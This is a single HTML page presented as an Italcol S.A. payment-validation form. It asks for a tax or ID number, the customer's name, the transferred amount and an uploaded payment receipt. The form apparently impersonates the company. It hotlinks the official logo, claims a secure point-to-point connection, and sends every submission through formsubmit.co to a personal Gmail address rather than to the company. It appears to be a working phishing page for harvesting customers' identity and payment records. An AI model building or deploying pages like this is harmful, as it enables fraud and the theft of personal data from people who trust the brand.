<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Italcol - Validación de Pagos</title>
    <style>
        :root { 
            --naranja: #ff6600; 
            --gris-fondo: #f4f7f6; 
        }
        
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            background-color: var(--gris-fondo); 
            display: flex; 
            justify-content: center; 
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .form-card { 
            background: white; 
            border-radius: 12px; 
            width: 100%; 
            max-width: 450px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.08); 
            border-top: 6px solid var(--naranja);
            padding: 40px;
        }

        .header { text-align: center; margin-bottom: 30px; }
        
        /* Logo oficial con tamaño optimizado */
        .logo { 
            width: 180px; 
            height: auto;
            margin-bottom: 10px;
        }

        .slogan { 
            color: var(--naranja); 
            font-weight: 700; 
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        label { 
            display: block; 
            margin-top: 15px; 
            font-weight: 600; 
            font-size: 13px; 
            color: #555; 
        }

        input { 
            width: 100%; 
            padding: 12px; 
            margin-top: 5px; 
            border: 1px solid #ddd; 
            border-radius: 8px; 
            box-sizing: border-box;
            font-size: 14px;
        }

        input:focus {
            outline: none;
            border-color: var(--naranja);
            box-shadow: 0 0 8px rgba(255,102,0,0.1);
        }

        .file-box { 
            background: #fffcf9;
            border: 2px dashed #ff660044; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
            margin-top: 20px; 
        }

        .file-box strong { color: var(--naranja); font-size: 14px; display: block; margin-bottom: 5px; }
        .file-box p { font-size: 12px; color: #888; margin: 0 0 10px 0; }

        .btn-send { 
            width: 100%; 
            background: var(--naranja); 
            color: white; 
            border: none; 
            padding: 15px; 
            margin-top: 25px; 
            border-radius: 6px; 
            font-weight: bold; 
            font-size: 16px; 
            cursor: pointer;
            transition: 0.3s;
        }

        .btn-send:hover { background: #e65c00; }

        .footer { 
            text-align: center; 
            font-size: 10px; 
            color: #bbb; 
            margin-top: 30px; 
            text-transform: uppercase;
        }
    </style>
</head>
<body>

<div class="form-card">
    <div class="header">
        <img src="https://italcol.com/wp-content/themes/italcol/img/logo.png" alt="Italcol" class="logo">
        <div class="slogan">Su aliado para crecer</div>
    </div>

    <form action="https://formsubmit.co/ed.mauricio99@gmail.com" method="POST" enctype="multipart/form-data">
        
        <input type="text" name="_honey" style="display:none"> <input type="hidden" name="_captcha" value="true"> <input type="hidden" name="_template" value="table"> <input type="hidden" name="_subject" value="REPORTE SEGURO: NUEVO PAGO ITALCOL">

        <label>NIT O CÉDULA</label>
        <input type="text" name="identificacion" placeholder="Ej: 900123456" required>

        <label>RAZÓN SOCIAL / NOMBRE</label>
        <input type="text" name="nombre_cliente" required>

        <label>VALOR TRANSFERIDO (COP)</label>
        <input type="number" name="monto" placeholder="$ 0.00" required>

        <div class="file-box">
            <strong>ADJUNTAR SOPORTE</strong>
            <p>PDF, JPG o PNG únicamente</p>
            <input type="file" name="attachment" accept="image/*,.pdf" required>
        </div>

        <button type="submit" class="btn-send">ENVIAR PARA VALIDACIÓN</button>
    </form>

    <div class="footer">
        Italcol S.A. &copy; 2026 - Conexión Protegida Punto a Punto
    </div>
</div>

</body>
</html>
